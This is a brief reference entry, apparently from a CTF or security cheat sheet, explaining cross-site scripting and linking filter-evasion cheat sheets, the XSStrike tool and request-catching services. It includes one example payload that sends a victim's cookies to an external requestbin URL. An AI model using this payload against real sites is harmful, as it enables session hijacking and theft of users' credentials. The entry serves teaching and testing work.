The **XSS** vulnerability occurs when a user can control the content of a web page. A malicious code can be used to steal cookies of authentified users, redirect the user to a malicious site, or even execute arbitrary code on the user's machine.

Exemple of XSS :

```html
<img src="#" onerror="document.location='http://requestbin.fullcontact.com/168r30u1?c' + document.cookie">
```

* [XSS Cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

* Filter Evasion

	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) can be used to bypass XSS filters.



* [XSStrike](https://github.com/UltimateHackers/XSStrike)

	A python CLI tool for XSS detection and exploitation.

* [`requestb.in`](https://requestb.in/)

	Can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.

* [`hookbin.com`](https://hookbin.com/)

	Can be used to catch HTTP requests. Typically these are controlled and set by finding a [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) vulnerabilty.